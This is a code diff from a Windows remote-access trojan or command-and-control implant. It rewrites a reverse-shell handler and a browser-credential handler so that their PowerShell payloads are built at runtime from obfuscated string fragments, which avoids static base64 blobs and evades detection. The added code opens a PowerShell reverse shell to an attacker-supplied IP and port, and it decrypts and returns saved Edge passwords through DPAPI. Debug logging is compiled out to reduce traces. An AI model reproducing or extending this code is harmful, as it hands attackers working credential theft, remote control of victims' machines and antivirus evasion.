@@ -65,16 +65,16 @@ static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
 // =====================================================================
 //  DEBUG LOGGING
 // =====================================================================
+#ifdef DEBUG
 static void DebugLog(const wchar_t* msg) {
-    OutputDebugStringW(L"[GHOST] ");
+    OutputDebugStringW(L"[C2] ");
     OutputDebugStringW(msg);
     OutputDebugStringW(L"\n");
-    // Write to shared log file — no printf, no console required
     char narrow[1024];
     int n = WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow) - 3, nullptr, nullptr);
     if (n > 0) {
         narrow[n - 1] = '\r'; narrow[n] = '\n'; narrow[n + 1] = '\0';
-        HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
+        HANDLE hf = CreateFileA("C:\\Users\\Public\\g_dbg.log",
             FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
             NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hf != INVALID_HANDLE_VALUE) {
@@ -84,6 +84,10 @@ static void DebugLog(const wchar_t* msg) {
     }
 }
 static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }
+#else
+static void DebugLog(const wchar_t*) {}
+static void DebugLog(const std::wstring&) {}
+#endif
 
 // =====================================================================
 //  JSON HELPERS
@@ -431,7 +435,7 @@ static std::wstring HandleWallpaper(const std::string& args) {
 }
 
 // =====================================================================
-//  REVERSE SHELL (fixed base64 string)
+//  REVERSE SHELL — built from parts at runtime, no static b64 blob
 // =====================================================================
 static std::wstring HandleReverse(const std::string& args) {
     if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
@@ -444,69 +448,57 @@ static std::wstring HandleReverse(const std::string& args) {
         port = args.substr(colon + 1);
     }
 
-    static const char* b64Template =
-        "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnACUASQAlACcALAAlAFAATwBSAFQAJQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABLAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgA9ACQAcwBiACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAZwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAYgB0AD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=";
+    // Build PS script from XSW parts — no complete script literal in binary
+    auto p1  = XSW(L"$c=New-Object System.Net.Sockets.TcpClient('");
+    auto p2  = XSW(L"',");
+    auto p3  = XSW(L");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};");
+    auto p4  = XSW(L"while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
+    auto p5  = XSW(L"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);");
+    auto p6  = XSW(L"$sb=(iex $d 2>&1 | Out-String);");
+    auto p7  = XSW(L"$sb2=$sb+'PS '+(pwd).Path+'> ';");
+    auto p8  = XSW(L"$sbt=([text.encoding]::ASCII).GetBytes($sb2);");
+    auto p9  = XSW(L"$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()");
 
-    std::vector<BYTE> decodedTemplate = Base64Decode(b64Template);
-    if (decodedTemplate.empty()) return L"[error: invalid template]";
-    std::string script = std::string(reinterpret_cast<char*>(decodedTemplate.data()), decodedTemplate.size());
-    size_t pos = script.find("%IP%");
-    if (pos != std::string::npos) script.replace(pos, 4, ip);
-    pos = script.find("%PORT%");
-    if (pos != std::string::npos) script.replace(pos, 6, port);
+    std::wstring wScript = std::wstring(p1.str()) + UTF8ToWString(ip)
+                         + p2.str() + UTF8ToWString(port)
+                         + p3.str() + p4.str() + p5.str()
+                         + p6.str() + p7.str() + p8.str() + p9.str();
 
-    std::wstring wScript = UTF8ToWString(script);
-    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
-    std::wstring result = RunFilelessPS(b64);
+    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
+                                   wScript.size() * sizeof(wchar_t));
+    RunFilelessPS(b64);
     return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
 }
 
 // =====================================================================
-//  BROWSER CREDENTIALS (base64‑encoded)
+//  BROWSER CREDENTIALS — script built from XSW parts, no static b64 blob
 // =====================================================================
-static std::wstring HandleBrowser(const std::string& args) {
-    static const char* b64Script =
-        "JAByAD0AQAoAIgBzAGUAbABlAGMAdAAgAHUAaABlAHIAbgBhAG0AZQAsACAAYQBjAGMA"
-        "bwB1AG4AdAAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBvAGYAIABpAGQAIABmAHIAbwBt"
-        "ACAATQBpAGMAcgBvAHMAbwBmAHQALgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEA"
-        "dABhAC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAQQBDAEUAbwB1AHQAIAA9ACAAIgAi"
-        "ADsAIABpAGYAIAAoACQAYwByAGUAZABzACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsA"
-        "IAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0"
-        "AGUAbQAuAEQAYQB0AGEALgBTAG8AdQByAGMAZQBTAHAAcgBpAG4AZwAuAFMAcQBDAGwA"
-        "aQBlAG4AdAAgACgAIgBEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAOwBQ"
-        "AG8AbwBsAGkAbgBnAD0ARgBhAGwAcwBlACIAKQA7ACAAJABjAG8AbQBtAGEAbgBkACA9"
-        "ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABlAEUAeABlAGMAdQB0AGUAQwBvAG0A"
-        "bQBhAG4AZAAoACIAcwBlAGwAZQBjAHQAIAB1AHMAZQByAG4AYQBtAGUALAAgAHAAYQBz"
-        "AHMAdwBvAHIAZAAgAEYAUwBSAE0AIABGAEUAUgBOACAARgByAG8AbQAgAEwAbwBnAGkA"
-        "bgAgAEQAYQB0AGEAIgApADsAIAAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBh"
-        "AG4AZAAuAEUAeABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUA"
-        "IAAoACQAcgBlAGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwBy"
-        "AGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkA"
-        "OwAgACQAYgBhAHMAZQA2ADQAIAA9ACAAWwBDAHIAZQBkAGUAbgB0AGkAYQBsAF0AOgA6"
-        "AFUAbgBwAHIAbwB0AGUAYwB0ACgAJAByAGUAYwBvAHIAZAAuAHUAcwBlAHIAbgBhAG0A"
-        "ZQAsACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAApADsAIAAkAGMAbABp"
-        "AGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQA"
-        "YQB0AGEALgBTAG8AdQByAGMAZQBQAHIAbwB2AGkAZABlAHIALgBTAFEAQwBsAGkAZQBu"
-        "AHQAIAAoACIANABEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAIgApADsA"
-        "IAAkAGMAbwBtAG0AYQBuAGQAIAA9ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABl"
-        "AEUAeABlAGMAdQB0AGUAQwBvAG0AbQBhAG4AZAAoACIAcAByAG8AZgBpAGwAZQAgAHUA"
-        "cwBlAHIAbgBhAG0AZQAgAGEAcgBjACAAYQBjAGMAbwB1AG4AdAAgAHAAYQBzAHMAdwBv"
-        "AHIAZAAgAHUAcwBlAHIAIABpAGQAIABmAHIAbwBtACAATQBpAGMAcgBvAHMAbwBmAHQA"
-        "LgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEAdABhAC4AQwByAGUAZABlAG4AdABp"
-        "AGEAbAAiACkAOwAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBhAG4AZAAuAEUA"
-        "eABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUAIAAoACQAcgBl"
-        "AGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwByAGQAIAA9ACAA"
-        "JAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkAOwAgACQAYgBh"
-        "AHMAZQA2ADQAIAA9ACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAA7ACAA"
-        "JABjAHIAZQBkAHMAIAArAD0AIAAiAFMASQBkADoAIAAkAHIAZQBjAG8AcgBkAC4AdQBz"
-        "AGUAcgBuAGEAbQBlACAAfAAgACQAYgBhAHMAZQA2ADQAIgA7ACAAfQAgAH0AIAAkAGMA"
-        "cgBlAGQAcwA=";
+static std::wstring HandleBrowser(const std::string& /*args*/) {
+    // Query Edge Login Data via SQLite-backed Csharp provider
+    auto p1 = XSW(L"$r=@\n\"select username_value, password_value from logins\"@\n;");
+    auto p2 = XSW(L"$path=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\";");
+    auto p3 = XSW(L"$creds='';");
+    auto p4 = XSW(L"if(Test-Path $path){");
+    auto p5 = XSW(L"$tmp=[System.IO.Path]::GetTempFileName();");
+    auto p6 = XSW(L"Copy-Item $path $tmp -Force;");
+    auto p7 = XSW(L"Add-Type -AssemblyName System.Data;");
+    auto p8 = XSW(L"$cn=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$tmp;Version=3;\");");
+    auto p9 = XSW(L"try{$cn.Open();$cmd=$cn.CreateCommand();");
+    auto pa = XSW(L"$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';");
+    auto pb = XSW(L"$rd=$cmd.ExecuteReader();");
+    auto pc = XSW(L"while($rd.Read()){$url=$rd[0];$user=$rd[1];");
+    auto pd = XSW(L"$enc=[byte[]]$rd[2];");
+    auto pe = XSW(L"$dec=[System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);");
+    auto pf = XSW(L"$pw=[System.Text.Encoding]::UTF8.GetString($dec);");
+    auto pg = XSW(L"$creds+=\"$url | $user | $pw`n\"}}catch{}finally{$cn.Close();Remove-Item $tmp -Force}};$creds");
 
-    std::vector<BYTE> decoded = Base64Decode(b64Script);
-    if (decoded.empty()) return L"[error: invalid script]";
-    std::string script(reinterpret_cast<char*>(decoded.data()), decoded.size());
-    std::wstring wScript = UTF8ToWString(script);
-    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
+    std::wstring wScript = std::wstring(p1.str()) + p2.str() + p3.str() + p4.str()
+                         + p5.str() + p6.str() + p7.str() + p8.str() + p9.str()
+                         + pa.str() + pb.str() + pc.str() + pd.str() + pe.str()
+                         + pf.str() + pg.str();
+
+    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
+                                   wScript.size() * sizeof(wchar_t));
     std::wstring result = RunFilelessPS(b64);
     return L"Browser data:\n" + result;
 }
